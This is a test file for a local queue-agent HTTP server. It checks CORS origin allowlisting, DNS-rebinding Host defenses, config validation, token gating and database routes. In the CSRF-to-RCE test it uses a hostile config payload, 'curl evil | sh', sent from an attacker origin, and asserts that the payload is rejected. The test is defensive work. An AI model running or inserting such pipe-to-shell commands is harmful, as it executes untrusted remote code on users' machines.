import { Database } from 'bun:sqlite';
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { rmSync } from 'node:fs';
import { dbExportCsv, exportWorkerLoad, MissingDbError, setExportWorkerFactory } from '../agent/db';
import { ProcessManager } from '../agent/manager';
import {
  corsHeaders,
  createFetchHandler,
  hostnameOf,
  isHostAllowed,
  isOriginAllowed,
  resolveAllowedHosts,
  resolveAllowedOrigins,
} from '../agent/server';

const ALLOWED = ['http://localhost:5273'];

function put(
  url: string,
  body: unknown,
  origin: string | null,
  headers: Record<string, string> = {}
) {
  return new Request(url, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      ...(origin ? { Origin: origin } : {}),
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

describe('agent origin policy', () => {
  test('isOriginAllowed: allowlist + no-origin, rejects others (trailing slash tolerant)', () => {
    expect(isOriginAllowed('http://localhost:5273', ALLOWED)).toBe(true);
    expect(isOriginAllowed('http://localhost:5273/', ALLOWED)).toBe(true);
    expect(isOriginAllowed(null, ALLOWED)).toBe(true); // curl / same process
    expect(isOriginAllowed('https://evil.example', ALLOWED)).toBe(false);
  });

  test('resolveAllowedOrigins merges dev defaults with env, deduped', () => {
    const out = resolveAllowedOrigins({
      AGENT_ALLOWED_ORIGINS: 'https://dash.example/, http://localhost:5273',
    } as NodeJS.ProcessEnv);
    expect(out).toContain('http://localhost:5273');
    expect(out).toContain('http://127.0.0.1:5273');
    expect(out).toContain('https://dash.example');
    expect(out.filter((o) => o === 'http://localhost:5273')).toHaveLength(1);
  });

  test('CORS never returns a wildcard and only reflects allowed origins', () => {
    expect(corsHeaders('http://localhost:5273', ALLOWED)['Access-Control-Allow-Origin']).toBe(
      'http://localhost:5273'
    );
    // disallowed / absent origin → no ACAO at all (browser blocks), never `*`
    expect(
      corsHeaders('https://evil.example', ALLOWED)['Access-Control-Allow-Origin']
    ).toBeUndefined();
    expect(corsHeaders(null, ALLOWED)['Access-Control-Allow-Origin']).toBeUndefined();
    for (const o of [null, 'https://evil.example', 'http://localhost:5273']) {
      expect(corsHeaders(o, ALLOWED)['Access-Control-Allow-Origin']).not.toBe('*');
    }
  });
});

describe('agent DNS-rebinding (Host header) defense', () => {
  test('hostnameOf strips port and unwraps IPv6', () => {
    expect(hostnameOf('localhost:6800')).toBe('localhost');
    expect(hostnameOf('127.0.0.1')).toBe('127.0.0.1');
    expect(hostnameOf('EVIL.EXAMPLE:80')).toBe('evil.example');
    expect(hostnameOf('[::1]:6800')).toBe('::1');
    expect(hostnameOf('[::1]')).toBe('::1');
  });

  // A bare IPv6 literal has no port delimiter — splitting at the first colon
  // both locked the real host out and allowlisted a bogus label ('2001').
  test('hostnameOf keeps an unbracketed IPv6 literal whole', () => {
    expect(hostnameOf('2001:db8::5')).toBe('2001:db8::5');
    expect(hostnameOf('::1')).toBe('::1');
    expect(hostnameOf(hostnameOf('[::1]'))).toBe('::1'); // idempotent
  });

  test('resolveAllowedHosts accepts an unbracketed IPv6 from AGENT_ALLOWED_HOSTS', () => {
    const out = resolveAllowedHosts({ AGENT_ALLOWED_HOSTS: '2001:db8::5' } as NodeJS.ProcessEnv);
    expect(out).toContain('2001:db8::5');
    expect(out).not.toContain('2001');
    expect(isHostAllowed('[2001:db8::5]:6800', out)).toBe(true);
  });

  test('resolveAllowedHosts: loopback defaults + env + extra, hostname-only, deduped', () => {
    const out = resolveAllowedHosts(
      { AGENT_ALLOWED_HOSTS: 'dash.example:8080, localhost' } as NodeJS.ProcessEnv,
      ['http://queue.internal:6790', '127.0.0.1']
    );
    expect(out).toContain('localhost');
    expect(out).toContain('127.0.0.1');
    expect(out).toContain('dash.example');
    // extra passed as full origins is reduced to a hostname too
    expect(out).toContain('queue.internal');
    expect(out.filter((h) => h === 'localhost')).toHaveLength(1);
  });

  test('isHostAllowed: disabled when undefined, otherwise fail-closed and hostname-based', () => {
    expect(isHostAllowed('evil.example', undefined)).toBe(true); // check disabled
    expect(isHostAllowed(null, ['localhost'])).toBe(false);
    expect(isHostAllowed('localhost:6800', ['localhost'])).toBe(true);
    expect(isHostAllowed('evil.example:6800', ['localhost', '127.0.0.1'])).toBe(false);
  });

  test('handler: a rebinding or missing Host is 403; allowlisted loopback passes', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, {
      allowedOrigins: ALLOWED,
      allowedHosts: ['localhost', '127.0.0.1'],
    });
    const get = (host: string | null) =>
      handle(
        new Request('http://127.0.0.1:6800/control/status', {
          headers: host ? { host } : {},
        })
      );

    // DNS-rebound page: same-origin GET, no Origin, attacker Host → blocked.
    expect((await get('evil.example')).status).toBe(403);
    // Legitimate loopback access still reads.
    expect((await get('localhost:6800')).status).toBe(200);
    expect((await get('127.0.0.1:6800')).status).toBe(200);
    // Once the check is configured, even an unusual no-Host proxy path fails closed.
    expect((await get(null)).status).toBe(403);
  });

  test('handler: without allowedHosts the Host check is a no-op (backward compatible)', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      new Request('http://127.0.0.1:6800/control/status', {
        headers: { host: 'evil.example' },
      })
    );
    expect(res.status).toBe(200);
  });
});

describe('agent config runtime validation', () => {
  test('invalid JSON shapes return 400 and the config update is atomic', async () => {
    const m = new ProcessManager();
    const before = m.getConfig();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const invalid = [
      { command: '' },
      { httpPort: '7000' },
      { tcpPort: 1.25 },
      { dataPath: 42 },
      { extraEnv: { OK: 'yes', BAD: false } },
      { unknown: 'field' },
      { httpPort: 7000, tcpPort: 70_000 },
    ];

    for (const body of invalid) {
      const res = await handle(
        put('http://127.0.0.1:6800/control/config', body, 'http://localhost:5273')
      );
      expect(res.status).toBe(400);
      expect(((await res.json()) as { ok: boolean }).ok).toBe(false);
      expect(m.getConfig()).toEqual(before);
    }

    const invalidShape = await handle(
      put('http://127.0.0.1:6800/control/config', ['not', 'an', 'object'], null)
    );
    expect(invalidShape.status).toBe(400);
    expect(m.getConfig()).toEqual(before);

    const malformed = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: '{"httpPort":',
      })
    );
    expect(malformed.status).toBe(400);
    expect(m.getConfig()).toEqual(before);
  });

  test('a complete valid patch is accepted', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      put(
        'http://127.0.0.1:6800/control/config',
        {
          command: 'bunqueue start',
          httpPort: 7100,
          tcpPort: 7101,
          dataPath: '',
          extraEnv: { LOG_LEVEL: 'debug' },
        },
        'http://localhost:5273'
      )
    );
    expect(res.status).toBe(200);
    expect(m.getConfig()).toMatchObject({
      httpPort: 7100,
      tcpPort: 7101,
      dataPath: '',
      extraEnv: { LOG_LEVEL: 'debug' },
    });
  });
});

describe('agent managed-server health probe', () => {
  test('reports healthy only when a 2xx JSON body has ok exactly true', async () => {
    const m = new ProcessManager();
    m.setConfig({ command: 'sleep 30' });
    await m.start();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const realFetch = globalThis.fetch;
    try {
      for (const payload of [{}, { ok: false }, { ok: 'true' }, { ok: 1 }, null]) {
        globalThis.fetch = (() => Promise.resolve(Response.json(payload))) as typeof fetch;
        const res = await handle(new Request('http://127.0.0.1:6800/control/status'));
        expect(res.status).toBe(200);
        expect(((await res.json()) as { healthy: boolean }).healthy).toBe(false);
      }

      globalThis.fetch = (() =>
        Promise.resolve(Response.json({ ok: true, version: '1.2.3' }))) as typeof fetch;
      const healthy = await handle(new Request('http://127.0.0.1:6800/control/status'));
      expect(await healthy.json()).toMatchObject({ healthy: true, version: '1.2.3' });
    } finally {
      globalThis.fetch = realFetch;
      await m.stop();
    }
  });
});

describe('agent CSRF-to-RCE protection', () => {
  test('cross-origin config PUT is rejected 403 and never mutates the launch command', async () => {
    const m = new ProcessManager();
    const before = m.getConfig().command;
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });

    const res = await handle(
      put(
        'http://127.0.0.1:6800/control/config',
        { command: 'curl evil | sh' },
        'https://evil.example'
      )
    );

    expect(res.status).toBe(403);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBeNull();
    // The RCE vector: the attacker-supplied command must NOT have been merged.
    expect(m.getConfig().command).toBe(before);
    expect(m.getConfig().command).not.toContain('evil');
  });

  test('same-origin (dashboard) config PUT succeeds and reflects the origin', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 7777 }, 'http://localhost:5273')
    );
    expect(res.status).toBe(200);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
    expect(m.getConfig().httpPort).toBe(7777);
  });

  test('non-browser caller (no Origin) still works for local use', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(put('http://127.0.0.1:6800/control/config', { httpPort: 8123 }, null));
    expect(res.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(8123);
  });

  test('OPTIONS preflight validates Host and Origin before returning 204', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, {
      allowedOrigins: ALLOWED,
      allowedHosts: ['127.0.0.1'],
      token: 's3cret',
      requireTokenForAll: true,
    });
    const ok = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: '127.0.0.1:6800', Origin: 'http://localhost:5273' },
      })
    );
    expect(ok.status).toBe(204);
    expect(ok.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');

    const badOrigin = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: '127.0.0.1:6800', Origin: 'https://evil.example' },
      })
    );
    expect(badOrigin.status).toBe(403);
    expect(badOrigin.headers.get('Access-Control-Allow-Origin')).toBeNull();

    const badHost = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Host: 'evil.example', Origin: 'http://localhost:5273' },
      })
    );
    expect(badHost.status).toBe(403);
    // Host is rejected, but the exact allowed Origin is still reflected so a
    // browser can read the JSON error; no ProcessManager route was reached.
    expect(badHost.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
  });
});

describe('agent /db segment routing', () => {
  // Guards the ROUTER layer (createFetchHandler) that resolves
  // /db/tables/:name vs /db/tables/:name/{schema,cell} — reverting to the old
  // `pathname.endsWith('/schema')` logic must fail these.
  const PATH = `/tmp/bq-agent-route-test-${process.pid}.db`;
  const ORIGIN = 'http://localhost:5273';
  let handle: (req: Request) => Promise<Response>;

  const get = (path: string) =>
    handle(new Request(`http://127.0.0.1:6800${path}`, { headers: { Origin: ORIGIN } }));

  class InlineExportWorker {
    private readonly listeners = new Map<string, ((event: unknown) => void)[]>();

    addEventListener(type: string, listener: (event: unknown) => void): void {
      this.listeners.set(type, [...(this.listeners.get(type) ?? []), listener]);
    }

    private emit(type: string, event: unknown): void {
      for (const listener of this.listeners.get(type) ?? []) listener(event);
    }

    postMessage(message: unknown): void {
      queueMicrotask(() => {
        const request = message as {
          path: string;
          table: string;
          orderBy?: string;
          dir: 'asc' | 'desc';
          filter?: Parameters<typeof dbExportCsv>[4];
        };
        try {
          this.emit('message', {
            data: {
              ok: true,
              export: dbExportCsv(
                request.path,
                request.table,
                request.orderBy,
                request.dir,
                request.filter
              ),
            },
          });
        } catch (error) {
          this.emit('message', {
            data: {
              ok: false,
              error: (error as Error).message,
              missing: error instanceof MissingDbError,
            },
          });
        }
      });
    }

    terminate(): void {}

    asWorker(): Worker {
      return this as unknown as Worker;
    }
  }

  const installInlineExportWorker = () => {
    setExportWorkerFactory(() => new InlineExportWorker().asWorker());
  };

  beforeAll(() => {
    // Real Worker + happy-dom globals can abort Bun's test process. Routing is
    // tested with the exact worker protocol here; a separate db.ts regression
    // test exercises the real source-mode worker and transferable buffer.
    installInlineExportWorker();
    const db = new Database(PATH);
    db.run('CREATE TABLE jobs (id TEXT PRIMARY KEY, queue TEXT)');
    db.run("INSERT INTO jobs VALUES ('j1', 'emails')");
    // A table literally named after a sub-resource suffix — the routing edge.
    db.run('CREATE TABLE "schema" (a INTEGER)');
    db.run('INSERT INTO "schema" VALUES (1)');
    db.run('CREATE TABLE huge_rowid (payload TEXT)');
    db.run("INSERT INTO huge_rowid(rowid, payload) VALUES (9007199254740993, 'exact-row')");
    db.close();
    const m = new ProcessManager();
    m.setConfig({ dataPath: PATH });
    handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
  });

  afterAll(() => {
    setExportWorkerFactory(null);
    for (const s of ['', '-wal', '-shm']) rmSync(`${PATH}${s}`, { force: true });
  });

  test('single segment → rows route', async () => {
    const res = await get('/db/tables/jobs?limit=10');
    expect(res.status).toBe(200);
    const body = (await res.json()) as { columns: string[]; total: number };
    expect(body.columns).toEqual(['id', 'queue']);
    expect(body.total).toBe(1);
  });

  test('<table>/schema → schema route', async () => {
    const res = await get('/db/tables/jobs/schema');
    expect(res.status).toBe(200);
    const body = (await res.json()) as { columns: { name: string }[] };
    expect(body.columns.map((c) => c.name)).toEqual(['id', 'queue']);
  });

  test('<table>/export → one bounded CSV response with exposed contract metadata', async () => {
    const res = await get('/db/tables/jobs/export?orderBy=id&dir=asc');
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/csv; charset=utf-8');
    expect(res.headers.get('cache-control')).toBe('no-store, no-transform');
    expect(res.headers.get('x-bunqueue-db-export-version')).toBe('1');
    expect(decodeURIComponent(res.headers.get('x-bunqueue-db-export-table') ?? '')).toBe('jobs');
    expect(res.headers.get('x-bunqueue-db-export-rows')).toBe('1');
    expect(res.headers.get('x-bunqueue-db-export-cap')).toBe('none');
    expect(res.headers.get('access-control-expose-headers')).toContain(
      'X-Bunqueue-Db-Export-Bytes'
    );
    const csv = await res.text();
    expect(csv).toBe('id,queue\r\nj1,emails');
    expect(res.headers.get('x-bunqueue-db-export-bytes')).toBe(
      String(new TextEncoder().encode(csv).byteLength)
    );
  });

  test('export route rejects ambiguous or malformed view options', async () => {
    expect((await get('/db/tables/jobs/export?dir=sideways')).status).toBe(400);
    expect((await get('/db/tables/jobs/export?dir=asc&dir=desc')).status).toBe(400);
    expect((await get('/db/tables/jobs/export?fcol=queue&fop=eq')).status).toBe(400);
    expect((await get('/db/tables/jobs/export?limit=999999')).status).toBe(400);
  });

  test('a running export leaves control routes responsive and rejects a second scan', async () => {
    class HoldingExportWorker {
      private readonly listeners = new Map<string, ((event: unknown) => void)[]>();
      terminated = false;

      addEventListener(type: string, listener: (event: unknown) => void): void {
        this.listeners.set(type, [...(this.listeners.get(type) ?? []), listener]);
      }

      postMessage(_message: unknown): void {
        // Deliberately never answer: model SQLite inside a long scan/sort.
      }

      terminate(): void {
        this.terminated = true;
      }

      close(): void {
        for (const listener of this.listeners.get('close') ?? []) listener({});
      }

      asWorker(): Worker {
        return this as unknown as Worker;
      }
    }

    let worker: HoldingExportWorker | undefined;
    const controller = new AbortController();
    setExportWorkerFactory(() => {
      worker = new HoldingExportWorker();
      return worker.asWorker();
    });
    const pending = handle(
      new Request('http://127.0.0.1:6800/db/tables/jobs/export', {
        headers: { Origin: ORIGIN },
        signal: controller.signal,
      })
    );
    try {
      expect(exportWorkerLoad()).toBe(1);
      const [status, busy] = await Promise.all([
        get('/control/status'),
        get('/db/tables/jobs/export'),
      ]);
      expect(status.status).toBe(200);
      expect(busy.status).toBe(429);

      controller.abort(new Error('client disconnected'));
      expect((await pending).status).toBe(400);
      expect(worker?.terminated).toBe(true);
      // terminate() requests shutdown; the slot stays held until close proves
      // that the synchronous sqlite3_step can no longer consume a core.
      expect(exportWorkerLoad()).toBe(1);
      worker?.close();
      expect(exportWorkerLoad()).toBe(0);
    } finally {
      if (!controller.signal.aborted) controller.abort();
      await pending.catch(() => undefined);
      worker?.close();
      installInlineExportWorker();
    }
  });

  test('an export worker startup failure maps to service unavailable', async () => {
    setExportWorkerFactory(() => {
      throw new Error('worker runtime missing');
    });
    try {
      const response = await get('/db/tables/jobs/export');
      expect(response.status).toBe(503);
      expect(await response.json()).toMatchObject({ ok: false });
    } finally {
      installInlineExportWorker();
    }
  });

  test('<table>/cell → cell route (full value by rowid)', async () => {
    const rid = ((await (await get('/db/tables/jobs?limit=1')).json()) as { rowids: number[] })
      .rowids[0];
    const res = await get(`/db/tables/jobs/cell?rowid=${rid}&column=id`);
    expect(res.status).toBe(200);
    expect(((await res.json()) as { value: unknown }).value).toBe('j1');
  });

  test('cell route preserves an unsafe rowid string through parsing and SQLite binding', async () => {
    const page = (await (await get('/db/tables/huge_rowid?limit=1')).json()) as {
      rowids: Array<number | string>;
    };
    expect(page.rowids[0]).toBe('9007199254740993');
    const res = await get(`/db/tables/huge_rowid/cell?rowid=${page.rowids[0]}&column=payload`);
    expect(res.status).toBe(200);
    expect(((await res.json()) as { value: unknown }).value).toBe('exact-row');
  });

  test('table literally named "schema": rows AND its own schema both resolve', async () => {
    const rows = await get('/db/tables/schema'); // → rows of table 'schema', NOT a schema request
    expect(rows.status).toBe(200);
    expect(((await rows.json()) as { total: number }).total).toBe(1);

    const sch = await get('/db/tables/schema/schema'); // → schema of table 'schema'
    expect(sch.status).toBe(200);
    expect(
      ((await sch.json()) as { columns: { name: string }[] }).columns.map((c) => c.name)
    ).toEqual(['a']);
  });

  test('unknown sub-resource and over-deep paths → 404', async () => {
    expect((await get('/db/tables/jobs/nope')).status).toBe(404);
    expect((await get('/db/tables/jobs/schema/extra')).status).toBe(404);
  });
});

describe('agent token gate', () => {
  test('loopback policy keeps reads open while a configured token gates mutations', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED, token: 's3cr3t' });

    // no token → 401
    const denied = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273')
    );
    expect(denied.status).toBe(401);
    expect(m.getConfig().httpPort).not.toBe(9000);

    // bearer token → ok
    const okBearer = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273', {
        Authorization: 'Bearer s3cr3t',
      })
    );
    expect(okBearer.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(9000);

    // x-agent-token header → ok
    const okHeader = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9001 }, 'http://localhost:5273', {
        'X-Agent-Token': 's3cr3t',
      })
    );
    expect(okHeader.status).toBe(200);

    // reads unaffected by the token gate
    const read = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        headers: { Origin: 'http://localhost:5273' },
      })
    );
    expect(read.status).toBe(200);
  });

  test('network policy requires the token for every route, including sensitive reads', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, {
      allowedOrigins: ALLOWED,
      allowedHosts: ['dash.lan'],
      token: 's3cr3t',
      requireTokenForAll: true,
    });

    for (const path of ['/control/status', '/control/logs', '/control/config', '/db/tables']) {
      const denied = await handle(
        new Request(`http://dash.lan:6800${path}`, {
          headers: { Host: 'dash.lan:6800', Origin: 'http://localhost:5273' },
        })
      );
      expect(denied.status).toBe(401);
    }

    const allowed = await handle(
      new Request('http://dash.lan:6800/control/config', {
        headers: {
          Origin: 'http://localhost:5273',
          Host: 'dash.lan:6800',
          Authorization: 'Bearer s3cr3t',
        },
      })
    );
    expect(allowed.status).toBe(200);

    const rebound = await handle(
      new Request('http://dash.lan:6800/control/config', {
        headers: {
          Host: 'evil.example',
          Authorization: 'Bearer s3cr3t',
        },
      })
    );
    expect(rebound.status).toBe(403);
  });

  test('network policy fails closed when enabled without a configured token', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, {
      allowedOrigins: ALLOWED,
      requireTokenForAll: true,
    });
    const res = await handle(new Request('http://dash.lan:6800/control/status'));
    expect(res.status).toBe(401);
  });
});
